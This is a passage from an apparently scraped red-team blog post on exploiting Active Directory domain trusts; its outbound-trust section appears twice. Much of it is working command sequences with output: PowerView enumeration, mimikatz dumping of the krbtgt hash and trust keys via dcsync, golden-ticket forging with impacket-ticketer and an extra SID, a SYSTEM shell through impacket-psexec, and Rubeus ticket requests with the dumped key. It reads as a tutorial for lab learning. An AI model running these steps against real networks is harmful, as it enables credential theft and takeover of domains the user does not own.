the hashes and pivot to other workstations if we need to - or potentially compromise another domain!</p>\n<h1 id=\"Exploiting-Outbound-Trusts\"><a href=\"#Exploiting-Outbound-Trusts\" class=\"headerlink\" title=\"Exploiting Outbound Trusts\"></a>Exploiting Outbound Trusts</h1><p>Outbound trusts work a little different, as the traffic is flowing in a different direction. In the last example, <code>dan-feliciano.dev</code> trusted <code>dan-feliciano.pro</code>, however what if this was an outbound trust?</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\daz\\Documents&gt; Import-Module .\\PowerView.ps1</span><br><span class=\"line\"></span><br><span class=\"line\">PS C:\\Users\\daz\\Documents&gt; Get-DomainTrust</span><br><span class=\"line\"></span><br><span class=\"line\">SourceName      : dan-feliciano.dev</span><br><span class=\"line\">TargetName      : dan-feliciano.pro</span><br><span class=\"line\">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class=\"line\">TrustAttributes : </span><br><span class=\"line\">TrustDirection  : Outbound</span><br><span class=\"line\">WhenCreated     : 5/9/2024 9:46:13 PM</span><br><span class=\"line\">WhenChanged     : 5/9/2024 9:52:58 PM</span><br></pre></td></tr></table></figure>\n\n<p>Remember, now that this is an outbound trust, <code>dan-feliciano.dev</code> is the domain that is trusting <code>dan-feliciano.pro</code>. This means that <code>dan-feliciano.pro</code> can access the resources on <code>dan-feliciano.dev</code>. The issue with this, is that we are in control of the trusting domain in this case, and we shouldn’t be able to gain access to the trusted domain.</p>\n<p>Despite this, there are still ways to exploit this. Within a domain trust, there is a shared password that is automatically set to expire once every 30 days). This password is stored within a TDO, or Trusted Domain Object. Our main point of exploitation is the TDO, as these are stored within the <code>SYSTEM</code> machine that we currently have access to.</p>\n<p>We can dump the keys used for the TDO using <code>mimikatz</code> on the domain controller, however we’ll also need to find the GUID of the TDO which we currently have the ability to enumerate.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\daz\\Documents&gt; Get-DomainObject -Identity &quot;CN=dan-feliciano.pro,CN=System,DC=dan-feliciano,DC=dev&quot; | Select ObjectGuid</span><br><span class=\"line\"></span><br><span class=\"line\">objectguid                          </span><br><span class=\"line\">----------</span><br><span class=\"line\">f5ksj19d-72rt-81lt-92d5-92jd27c109p2</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have the GUID, we can dump the TDO using <code>mimikatz</code> and by performing a <code>dcsync</code>. What a DCSync will do in our case is have <code>mimikatz</code> act like a domain controller and dump all the credentials that it has access to on the current domain. Since we are supplying the GUID of the TDO, we can dump the respect <code>AES256</code>, <code>AES128</code>, and <code>RC4</code> hashes to the TDO.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\daz\\Documents&gt; .\\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:dan-feliciano.dev /guid:&#123;f5ksj19d-72rt-81lt-92d5-92jd27c109p2&#125;&quot; &quot;exit&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">[DC] &#x27;dan-feliciano.dev&#x27; will be the domain</span><br><span class=\"line\">[DC] &#x27;dc.dan-feliciano.dev&#x27; will be the DC server</span><br><span class=\"line\">[DC] Object with GUID &#x27;&#123;f5ksj19d-72rt-81lt-92d5-92jd27c109p2&#125;&#x27;</span><br><span class=\"line\">[rpc] Service  : ldap</span><br><span class=\"line\">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class=\"line\"></span><br><span class=\"line\">Object RDN           : dan-feliciano.pro</span><br><span class=\"line\"></span><br><span class=\"line\">** TRUSTED DOMAIN - Antisocial **</span><br><span class=\"line\"></span><br><span class=\"line\">Partner              : dan-feliciano.pro</span><br><span class=\"line\"> [ Out ] DAN-FELICIANO.PRO -&gt; DAN-FELICIANO.DEV</span><br><span class=\"line\">    * 5/9/2024 9:46:13 PM - CLEAR   - 58 0d 24 aa 1f f8 07 2c 2a d4 a8 cc 68 93 6e 20 5f ad 3b 32 e0 51 8e cc f0</span><br><span class=\"line\">\t* aes256_hmac       1. b48fcf2e5e6cf31e6ee73d35e1409aa0a903c44c514e024d6a2a30701ec6</span><br><span class=\"line\">\t* aes128_hmac       b48fcf2e5e6cf31e6ee73d35e1409aa0</span><br><span class=\"line\">\t* rc4_hmac_nt       e1087fb17c8e5b4f29c4e1c0cb161481</span><br><span class=\"line\"></span><br><span class=\"line\"> [Out-1] DAN-FELICIANO.PRO -&gt; DAN-FELICIANO.DEV</span><br><span class=\"line\">    * 5/9/2024 9:46:13 PM - CLEAR   - 58 0d 24 aa 1f f8 07 2c 2a d4 a8 cc 68 93 6e 20 5f ad 3b 32 e0 51 8e cc f0</span><br><span class=\"line\">\t* aes256_hmac       b48fcf2e5e6cf31e6ee73d35e1409aa0a903c44c514e024d6a2a30701ec6</span><br><span class=\"line\">\t* aes128_hmac       b48fcf2e5e6cf31e6ee73d35e1409aa0</span><br><span class=\"line\">\t* rc4_hmac_nt       e1087fb17c8e5b4f29c4e1c0cb161481</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>In this output, we see two passwords in their <code>AES256</code>, <code>AES128</code>, <code>RC4</code> values. We’re focused on the primary <code>[Out]</code> key and not the <code>[Out-1]</code> key, however it isn’t an issue in our situation because it hasn’t been 30 days since the creation of this trust. If 30 days were to pass since this point, then the passwords for both <code>[Out]</code> and <code>[Out-1]</code> might be different.</p>\n<p>What makes these types of hashes so dangerous to use is that we can use them for Pass-the-Hash methods into Kerberos for a multitude of different use cases. You’ll see that in the next part of the process, we’ll use it to impersonate a user and interact with the domain however we’d like.</p>\n<p>That being said, we have the hash for the TDO, but what user does it belong to? In our scenario, there are users called “trust users”, which are essentially trusted accounts that have the ability to access resources over the domain trust. While the domain trust is outbound, the trusted domain still requires a trust user to use in order to properly access our domain’s resources. This same trust user is present on the trusted domain, which we now have a hash for. We can discover valid trust users with another <code>PowerView</code> cmdlet, you can find an example of what you might see below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\daz\\Documents&gt; Get-DomainUser -Identity * -Properties DisplayName, MemberOf | fl</span><br><span class=\"line\"></span><br><span class=\"line\">displayname : DAN</span><br><span class=\"line\">memberof    : &#123;CN=Pro Users,CN=Users,DC=dan-feliciano,DC=pro&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>You can also use tools such as <code>ADSearch --search &quot;(objectCategory=user)&quot;</code> to discover valid machine accounts. Just for simplicities sake, we’ll stick with <code>PowerView</code>.</li>\n</ul>\n<p>This essentially tells us that there could be a valid trust account named <code>DAN$</code> amongst the <code>dan-feliciano.pro</code> domain.  Although we aren’t able to confirm this since we can’t access the any domain resources in the trusted domain, we can still attempt to try and determine if this is the right account. This is what makes this process semi-trivial, as we’re essentially guessing whether or not this is a valid trust account.</p>\n<p>We can use a tool called <code>Rubeus</code> to create a valid service ticket for the <code>DAN$</code> account. Rubeus is toolset that is used for Kerberos interaction and exploits, and it will assist in us being able to create TGTs and TGSs that we’ll need in order to access the foreign domain.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\daz\\Documents&gt; .\\Rubeus.exe asktgt /user:DAN$ /domain:dan-feliciano.pro /rc4:e1087fb17c8e5b4f29c4e1c0cb161481 /nowrap</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Action: Ask TGT</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Using rc4_hmac hash: e1087fb17c8e5b4f29c4e1c0cb161481</span><br><span class=\"line\">[*] Building AS-REQ (w/ preauth) for: &#x27;dan-feliciano.pro\\DAN$&#x27;</span><br><span class=\"line\">[*] Using domain controller: (DOMAIN CONTROLLER IP)</span><br><span class=\"line\">[+] TGT request successful!</span><br><span class=\"line\">[*] base64(ticket.kirbi):</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tdoIHrK[...snip...]Yit98s</span><br></pre></td></tr></table></figure>\n\n<p>This will return a TGT that we can now use on the remote domain, which can be used in a variety of situations. You can enumerate potential vectors with this TGT with tools such as <code>PowerSploit</code> or <code>ADSearch</code>. In some situations, we may be dealing with attacks such as constrained&#x2F;unconstrained delegation, Kerberoasting, ASREPRoasting, or even ADCS. I look forward to creating future posts regarding these exploits in the future.</p>\n<h1 id=\"Bidirectional-Trusts\"><a href=\"#Bidirectional-Trusts\" class=\"headerlink\" title=\"Bidirectional Trusts\"></a>Bidirectional Trusts</h1><p>I don’t plan on going specifically into an attack vector for <code>bidirectional</code> trust attacks, since you can essentially perform either of the trust attacks that were listed for inbound&#x2F;outbound as explained above. I do however want to explain a few of the methods that can be used for this.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\daz\\Documents&gt; Import-Module .\\PowerView.ps1</span><br><span class=\"line\"></span><br><span class=\"line\">PS C:\\Users\\daz\\Documents&gt; Get-DomainTrust</span><br><span class=\"line\"></span><br><span class=\"line\">SourceName      : dan-feliciano.dev</span><br><span class=\"line\">TargetName      : dan-feliciano.pro</span><br><span class=\"line\">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class=\"line\">TrustAttributes : </span><br><span class=\"line\">TrustDirection  : Bidirectional</span><br><span class=\"line\">WhenCreated     : 5/9/2024 10:28:52 PM</span><br><span class=\"line\">WhenChanged     : 5/9/2024 10:28:52 PM</span><br></pre></td></tr></table></figure>\n\n<p>Essentially this will tell us that both domains trust one another, and that both domains have access to each other’s resources. We can perform a variety of attacks as explained above, or we can create <code>Golden</code> or <code>Diamond</code> tickets used to access each of the domains.</p>\n<p>If we are a domain admin or have DA privileges in the child domain, this tells us that we also have DA privileges in the parent domain. This is through the idea of SID History, which (at a basic-level) causes the domains to share SIDs amongst the domain trust. The SID of the DA account we have access to will be inherited in the parent domain due to the bidirectional relationship.</p>\n<p>That’s essentially where <code>Golden</code> and <code>Diamond</code> tickets come into play, however I plan on leaving those for another post as I explained earlier. Domain dominance is a really interesting topic, and I am looking forward to researching more into it.</p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>Big thanks to RastaMouse and r0bit for getting me into this given the material that I’ve learned from. I encourage you all to progress through machines and chains on <code>Vulnlab</code>, as they really help with understanding Active Directory and Linux exploits; as well as just general red-team thinking.</p>\n<p><strong>Resources Used</strong></p>\n<ul>\n<li><a href=\"https://learn.microsoft.com/en-us/entra/identity/domain-services/concepts-forest-trust\">https://learn.microsoft.com/en-us/entra/identity/domain-services/concepts-forest-trust</a></li>\n<li><a href=\"https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d\">https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d</a></li>\n<li><a href=\"https://www.ibm.com/docs/en/db2/11.5?topic=windows-trust-relationships-between-domains\">https://www.ibm.com/docs/en/db2/11.5?topic=windows-trust-relationships-between-domains</a></li>\n<li><a href=\"https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets\">https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets</a></li>\n<li><a href=\"https://www.youtube.com/playlist?list=PLQbhlCtfsL39XMbLjmuu06hc1CIJsfuZ-\">https://www.youtube.com/playlist?list=PLQbhlCtfsL39XMbLjmuu06hc1CIJsfuZ-</a>*</li>\n</ul>\n","cover_type":"img","excerpt":"","more":"<p>I took inspiration from researching this topic from one of the recent machines that I wrote a writeup for, which you can find <a href=\"https://dan-feliciano.com/writeups/trusted/\">here</a> (you can probably get the interpretation from the name of the chain). The topic that I wanted to delve into today was the idea of Domain and Forest Trusts in an Active Directory environment. I tried getting a little creative with Lucidchart, as you’ll see in the images to follow.</p>\n<p>I’ll list a few topics that you’ll need to understand before we delve into domain and forest trusts, as it just helps with practice to know what these mean.</p>\n<ul>\n<li><strong>Domain Objects</strong>: These are essentially exactly what they mean in the main - domain objects are any asset in a domain that serves a purpose. This can include users, services, machines, user properties; almost anything you can think of.</li>\n<li><strong>KDC</strong>: The KDC (Key Distribution Center) is the architecture at the center of Kerberos. When a domain object is requesting access to a resource, the KDC will grant it either a TGT (for login) or a TGS (for login to a service).</li>\n<li><strong>Domain Dominance</strong>: You’ll probably hear this come up a lot in this post, it’s essentially red-team terminology for compromising domains and using that domains privileges to compromise another (to however many domains is needed for the compromising procedure).</li>\n<li><strong>SIDs</strong>: These are essentially principal names that give domain objects their level of authority. They are denoted as long strings of text that start with <code>S-1-5</code>, and can vary based on the domain object. (For example, an Administrator’s SID can be <code>S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-500</code>, where <code>500</code> represents their privilege level.)</li>\n<li><strong>Child&#x2F;Parent Domains</strong>: You’ll see me reference these two terms often. One domain is considered the parent domain (to which is allowed traffic towards the child domain) and the other is considered the child domain (to which the parent domain is allowing inbound traffic towards.)</li>\n<li><strong>Bidirectional Trusts</strong>: (Also called two-way trusts) This stems off of Child&#x2F;Parent domains, in which both domains are considered the Parent and the Child. This is due to both domains trusting one another.</li>\n<li><strong>Transitivity</strong>: This essentially is a chain of trusts amongst domains. If Domain&#x2F;Forest A trusts Domain&#x2F;Forest B, and Domain&#x2F;Forest B trusts Domain&#x2F;Forest C, then that means that A also trusts C. Dependent on the owner of the domains, there can be various other properties that belong to this chain of trusts.</li>\n</ul>\n<p>From a non-technical level, domain trusts are essentially rulesets that allows one domain to authenticate and access certain resources in a different domain. This essentially works by allowing the traffic for authentication to flow between both domains. This involves utilizing the KDC to authorize the domain object access to the specific domain in question.</p>\n<p>These trusts can either be <code>one-way</code> or <code>bidirectional</code>. Dependent on which domain is the trusting domain and which domain is the trusted domain, these one-way trusts can be labelled as <code>Inbound</code> or <code>Outbound</code>. This of course is in relation to the trusted domain that is able to access the trusting domains resources.</p>\n<p><img src=\"/images/research/domain-trusts/b.jpg\"></p>\n<p>If a trust is <code>bidirectional</code> then that means that both domains trust one another - and both domains can access the resources of one another.</p>\n<p>For forests, this works essentially the same way. If Forest A trusts on another Forest B, then Forest B will be able to access resources on Forest A (but not the other way around if it is a one-way trust!).</p>\n<p>To bounce off of the topic of <code>transitivity</code> as we discussed earlier, domains&#x2F;forests can be transitive or non-transitive. With a transitive entity, that same chain that I explained earlier (and in the image below) has transitivity enabled and multiple trusts can consist within that chain even if they aren’t directly related to one-another. However, if a domain trust is <code>non-transitive</code>, then this chain of trusts does not exist and each domain only has trust rights to the domain that they are delegated to.</p>\n<p><img src=\"/images/research/domain-trusts/c.jpg\"></p>\n<p>The image above entails a transitive domain trust, meaning that despite Domain A having a trust only on Domain B, that also means that it has a trust on Domain C since Domain B has a trust on Domain C.</p>\n<p>In most cases, attackers exploit domain trusts by utilizing Kerberos. You may have heard of Kerberos terms such as <code>Silver</code>, <code>Golden</code>, or even <code>Diamond</code> tickets. I’ll give a short outline to what we can do with these types of tickets, however I’d like to leave domain dominance to its own separate post at a later date.</p>\n<ul>\n<li><strong>Silver Tickets</strong>: A forged Kerberos service ticket that can be used to impersonate a computer account. These computer accounts are relative to services such as <code>MSSQL</code> or <code>IIS</code>.</li>\n<li><strong>Golden Tickets</strong>: A forged Kerberos service ticket that can be used to impersonate any user within the confines of the machine within the domain.</li>\n<li><strong>Diamond Tickets</strong>: Much similar to a golden ticket, except for the fact that the legitimate ticket that is issued is modified, and any TGS-REQs will have the relative AS-REQ before the request field.</li>\n</ul>\n<p>For our specific case below, we’ll be looking at different domain trusts and creating a <code>Golden</code> ticket for our study, as that’s all we’ll need. This can be leveraged by tools such as <code>mimikatz</code> or <code>Impacket</code>.</p>\n<p>Note that the environments that you’ll see in the examples to follow are not real domains or environments to be awareness, and I do not own them in any capacity. I am merely providing these as examples as to what you might see in an environment.</p>\n<h1 id=\"Domain-Trust-Enumeration\"><a href=\"#Domain-Trust-Enumeration\" class=\"headerlink\" title=\"Domain Trust Enumeration\"></a>Domain Trust Enumeration</h1><p>Generally speaking, one of the common methods I’ve found to enumerating a domain trust is by utilizing <code>PowerView</code>. From a red-team aspect, the <code>PowerView</code> module can be picked up by your standard anti-virus whether that be AVs such as Defender or McAfee. It’s essentially used to import modules into <code>PowerShell</code> that allow for further enumeration of domain objects in a domain, such as <code>groups</code>, <code>computers</code>, even <code>delegation</code> vulnerabilities.</p>\n<p>I’ve referenced the GitHub repository where you can find the script <a href=\"https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1\">here</a>. It’s a part of the larger <code>PowerSploit</code> module, which is used for broad pen-testing tasks and can helpful in a variety of situations. If you’re testing this locally, make sure to disable Windows Defender or create an exception for the <code>PowerView</code> script.</p>\n<p>Note that these examples I will be providing assume that we already have control over a domain denoted as <code>dan-feliciano.dev</code>. These </p>\n<p>To enumerate domain trusts, we can use one of the modules present in <code>PowerSploit</code> to get the current domain trust present on the system we have access to.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\daz\\Documents&gt; Import-Module .\\PowerView.ps1</span><br><span class=\"line\"></span><br><span class=\"line\">PS C:\\Users\\daz\\Documents&gt; Get-DomainTrust</span><br><span class=\"line\"></span><br><span class=\"line\">SourceName      : dan-feliciano.dev</span><br><span class=\"line\">TargetName      : dan-feliciano.pro</span><br><span class=\"line\">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class=\"line\">TrustAttributes : </span><br><span class=\"line\">TrustDirection  : Inbound</span><br><span class=\"line\">WhenCreated     : 5/9/2024 6:25:43 PM</span><br><span class=\"line\">WhenChanged     : 5/9/2024 6:38:25 PM</span><br></pre></td></tr></table></figure>\n\n<p>Due to the trust being inbound, this indicates to us that we have the authorization to grant domain objects access to the target domain <code>dan-feliciano.pro</code>. With this in mind, we can also begin to enumerate the domain through the trust using a different <code>PowerView</code> cmdlet.</p>\n<p>Just as a helpful tip to remember how this works - <code>dan-feliciano.dev</code> is the source of this trust, meaning that the trust direction is towards us. To reference this in a simpler sense, let says <code>dan-feliciano.dev</code> is Domain A and <code>dan-feliciano.pro</code> is Domain B. In our example, the trust direction is inbound from Domain B to Domain A, meaning (as Domain A) we have access to the resources in Domain B. Don’t get confused with the <code>Inbound</code> entry in the domain trust output, as that is relative to the TRUST, not the ACCESS.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\daz\\Documents&gt; Get-DomainComputer -Domain dan-feliciano.pro -Properties DnsHostName</span><br><span class=\"line\"></span><br><span class=\"line\">dnshostname</span><br><span class=\"line\">-----------      </span><br><span class=\"line\">dc.dan-feliciano.pro</span><br><span class=\"line\">finance.dan-feliciano.pro</span><br><span class=\"line\">db.dan-feliciano.pro</span><br><span class=\"line\">corp.dan-feliciano.pro</span><br><span class=\"line\">kiosk.dan-feliciano.pro</span><br></pre></td></tr></table></figure>\n\n<p>This now tells us every workstation that is present within the domain, along with their DNS name. The process from here is trivial, dependent on what you would need to compromise for your red teaming procedure. In some cases, we may want to get access to the low-level <code>kiosk</code>, and in others we may want to look at the domain controller denoted as <code>dc.dan-feliciano.pro</code>.</p>\n<p>From here your attack can vary based on the trust that is present between the two domains. I’ll go over all three different variants of these trusts and how to exploit them effectively.</p>\n<h1 id=\"Exploiting-Inbound-Trusts\"><a href=\"#Exploiting-Inbound-Trusts\" class=\"headerlink\" title=\"Exploiting Inbound Trusts\"></a>Exploiting Inbound Trusts</h1><p>As a preliminary example, let’s assume that we’re utilizing the same trust from the last section. This means that <code>dan-feliciano.dev</code> has a one-way inbound trust with the foreign domain <code>dan-feliciano.pro</code>.</p>\n<p>We can exploit this using a few Impacket tools which are present by default on the latest versions of Kali Linux, so we’ll use those to start. However we’ll need a few assets in order to do this:</p>\n<ul>\n<li>The <code>NTLM</code> hash of the <code>krbtgt</code> domain object on our current domain, <code>dan-feliciano.dev</code>.</li>\n<li>The <code>dan-feliciano.dev</code> domain object SID.</li>\n<li>The <code>dan-feliciano.pro</code> domain object SID.</li>\n</ul>\n<p>As explained previously, the objects in our domain can be given access to any of the resources that are present in <code>dan-feliciano.pro</code>. We can start by getting the assets above and by enumerating a few of the objects on the remote domain such as the <code>Enterprise Admins</code> foreign group.</p>\n<p>To start, we can grab both the <code>NTLM</code> hash and the <code>dan-feliciano.dev</code> domain SID by using <code>mimikatz</code> on the domain that we already control. If you haven’t used <code>mimikatz</code> before, it’s an extremely helpful tool used to dump domain information from registry in the post-exploitation phase of your red-teaming procedure. You can find the link to <code>mimikatz</code> in this GitHub repo <a href=\"https://github.com/ParrotSec/mimikatz\">here</a>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\daz\\Documents&gt; .\\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /user:krbtgt /patch&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>\n\n<p>This output from <code>mimikatz</code> should give us both the NTLM hash of the <code>krbtgt</code> user along with the domain SID, to which I’ll include in a list to prevent clutter.</p>\n<ul>\n<li><code>krbtgt</code> NTLM hash - <code>b84a08b41bd7e5e7f3708d0166d61bb1</code></li>\n<li><code>DAZ - dan-feliciano.dev</code> domain SID - <code>S-1-5-21-878395754-674829726-1647362892</code></li>\n</ul>\n<p>Next, we’ll use another <code>PowerView</code> cmdlet that allows us to view the <code>Enterprise Admins</code> group amongst the foreign domain and all it’s relative properties. The object that we’re looking at is the <code>MemberName</code> entry, which should contain the respective SID that we’re looking for.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\daz\\Documents&gt; Get-DomainForeignGroupMember -Domain dan-feliciano.pro</span><br><span class=\"line\"></span><br><span class=\"line\">GroupDomain             : dan-feliciano.pro</span><br><span class=\"line\">GroupName               : Enterprise Admins</span><br><span class=\"line\">GroupDistinguishedName  : CN=Enterprise,CN=Admins,CN=Builtin,DC=daz,DC=pro</span><br><span class=\"line\">MemberDomain            : dan-feliciano.pro</span><br><span class=\"line\">MemberName              : S-1-5-21-492758473-538291874-1904739281-519</span><br><span class=\"line\">MemberDistinguishedName : CN=S-1-5-21-492758473-538291874-1904739281-519,CN=ForeignSecurityPrincipals,DC=daz,DC=pro</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have all the information, we can progress with our exploit.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">daz@daz$ impacket-ticketer -nthash b84a08b41bd7e5e7f3708d0166d61bb1 -domain-sid S-1-5-21-878395754-674829726-1647362892 -extra-sid S-1-5-21-492758473-538291874-1904739281-519 -domain (trusting_domain) Administrator</span><br></pre></td></tr></table></figure>\n\n<p>This will create an <code>Administrator.ccache</code> file in the directory that we are currently present in. This is a credential cache, which holds the credentials of the Kerberos ticket that we just crafted. Since this is specifically a golden ticket we created, we can use this as our authentication point to access the other domain.</p>\n<p>Since we’re using Kerberos authentication, we’ll also need to set the <code>KRB5CCNAME</code> global variable on Kali Linux to point to the <code>ccache</code> file we just created.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">daz@daz$ export KRB5CCNAME=Administrator.ccache</span><br></pre></td></tr></table></figure>\n\n<p>Finally, we’ll need to run <code>PsExec</code> to establish a remote session to the workstation that we’d like to authenticate to. In our case, we’re looking to authenticate as the <code>Administrator</code> user using the full FQDN of the machine. Remember to add the IP addresses and all the domain names you’ll need in your <code>/etc/hosts</code> file.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">daz@daz$ impacket-psexec dan-feliciano.dev/Administrator@dc.dan-feliciano.pro -k -no-pass -target-ip (IP address of dc.dan-feliciano.pro)</span><br></pre></td></tr></table></figure>\n\n<p>And that should be all you’ll need. A remote shell session should be established through <code>PsExec</code>, which will do all the needful and open a reverse shell for you. From my experience, this creates a session as <code>SYSTEM</code>, which is the highest-authoritative account you have access to on a workstation. From here, we can dump all the hashes and pivot to other workstations if we need to - or potentially compromise another domain!</p>\n<h1 id=\"Exploiting-Outbound-Trusts\"><a href=\"#Exploiting-Outbound-Trusts\" class=\"headerlink\" title=\"Exploiting Outbound Trusts\"></a>Exploiting Outbound Trusts</h1><p>Outbound trusts work a little different, as the traffic is flowing in a different direction. In the last example, <code>dan-feliciano.dev</code> trusted <code>dan-feliciano.pro</code>, however what if this was an outbound trust?</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\daz\\Documents&gt; Import-Module .\\PowerView.ps1</span><br><span class=\"line\"></span><br><span class=\"line\">PS C:\\Users\\daz\\Documents&gt; Get-DomainTrust</span><br><span class=\"line\"></span><br><span class=\"line\">SourceName      : dan-feliciano.dev</span><br><span class=\"line\">TargetName      : dan-feliciano.pro</span><br><span class=\"line\">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class=\"line\">TrustAttributes : </span><br><span class=\"line\">TrustDirection  : Outbound</span><br><span class=\"line\">WhenCreated     : 5/9/2024 9:46:13 PM</span><br><span class=\"line\">WhenChanged     : 5/9/2024 9:52:58 PM</span><br></pre></td></tr></table></figure>\n\n<p>Remember, now that this is an outbound trust, <code>dan-feliciano.dev</code> is the domain that is trusting <code>dan-feliciano.pro</code>. This means that <code>dan-feliciano.pro</code> can access the resources on <code>dan-feliciano.dev</code>. The issue with this, is that we are in control of the trusting domain in this case, and we shouldn’t be able to gain access to the trusted domain.</p>\n<p>Despite this, there are still ways to exploit this. Within a domain trust, there is a shared password that is automatically set to expire once every 30 days). This password is stored within a TDO, or Trusted Domain Object. Our main point of exploitation is the TDO, as these are stored within the <code>SYSTEM</code> machine that we currently have access to.</p>\n<p>We can dump the keys used for the TDO using <code>mimikatz</code> on the domain controller, however we’ll also need to find the GUID of the TDO which we currently have the ability to enumerate.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\daz\\Documents&gt; Get-DomainObject -Identity &quot;CN=dan-feliciano.pro,CN=System,DC=dan-feliciano,DC=dev&quot; | Select ObjectGuid</span><br><span class=\"line\"></span><br><span class=\"line\">objectguid                          </span><br><span class=\"line\">----------</span><br><span class=\"line\">f5ksj19d-72rt-81lt-92d5-92jd27c109p2</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have the GUID, we can dump the TDO using <code>mimikatz</code> and by performing a <code>dcsync</code>. What a DCSync will do in our case is have <code>mimikatz</code> act like a domain controller and dump all the credentials that it has access to on the current domain. Since we are supplying the GUID of the TDO, we can dump the respect <code>AES256</code>, <code>AES128</code>, and <code>RC4</code> hashes to the TDO.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\daz\\Documents&gt; .\\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:dan-feliciano.dev /guid:&#123;f5ksj19d-72rt-81lt-92d5-92jd27c109p2&#125;&quot; &quot;exit&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">[DC] &#x27;dan-feliciano.dev&#x27; will be the domain</span><br><span class=\"line\">[DC] &#x27;dc.dan-feliciano.dev&#x27; will be the DC server</span><br><span class=\"line\">[DC] Object with GUID &#x27;&#123;f5ksj19d-72rt-81lt-92d5-92jd27c109p2&#125;&#x27;</span><br><span class=\"line\">[rpc] Service  : ldap</span><br><span class=\"line\">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class=\"line\"></span><br><span class=\"line\">Object RDN           : dan-feliciano.pro</span><br><span class=\"line\"></span><br><span class=\"line\">** TRUSTED DOMAIN - Antisocial **</span><br><span class=\"line\"></span><br><span class=\"line\">Partner              : dan-feliciano.pro</span><br><span class=\"line\"> [ Out ] DAN-FELICIANO.PRO -&gt; DAN-FELICIANO.DEV</span><br><span class=\"line\">    * 5/9/2024 9:46:13 PM - CLEAR   - 58 0d 24 aa 1f f8 07 2c 2a d4 a8 cc 68 93 6e 20 5f ad 3b 32 e0 51 8e cc f0</span><br><span class=\"line\">\t* aes256_hmac       1. b48fcf2e5e6cf31e6ee73d35e1409aa0a903c44c514e024d6a2a30701ec6</span><br><span class=\"line\">\t* aes128_hmac       b48fcf2e5e6cf31e6ee73d35e1409aa0</span><br><span class=\"line\">\t* rc4_hmac_nt       e1087fb17c8e5b4f29c4e1c0cb161481</span><br><span class=\"line\"></span><br><span class=\"line\"> [Out-1] DAN-FELICIANO.PRO -&gt; DAN-FELICIANO.DEV</span><br><span class=\"line\">    * 5/9/2024 9:46:13 PM - CLEAR   - 58 0d 24 aa 1f f8 07 2c 2a d4 a8 cc 68 93 6e 20 5f ad 3b 32 e0 51 8e cc f0</span><br><span class=\"line\">\t* aes256_hmac       b48fcf2e5e6cf31e6ee73d35e1409aa0a903c44c514e024d6a2a30701ec6</span><br><span class=\"line\">\t* aes128_hmac       b48fcf2e5e6cf31e6ee73d35e1409aa0</span><br><span class=\"line\">\t* rc4_hmac_nt       e1087fb17c8e5b4f29c4e1c0cb161481</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>In this output, we see two passwords in their <code>AES256</code>, <code>AES128</code>, <code>RC4</code> values. We’re focused on the primary <code>[Out]</code> key and not the <code>[Out-1]</code> key, however it isn’t an issue in our situation because it hasn’t been 30 days since the creation of this trust. If 30 days were to pass since this point, then the passwords for both <code>[Out]</code> and <code>[Out-1]</code> might be different.</p>\n<p>What makes these types of hashes so dangerous to use is that we can use them for Pass-the-Hash methods into Kerberos for a multitude of different use cases. You’ll see that in the next part of the process, we’ll use it to impersonate a user and interact with the domain however we’d like.</p>\n<p>That being said, we have the hash for the TDO, but what user does it belong to? In our 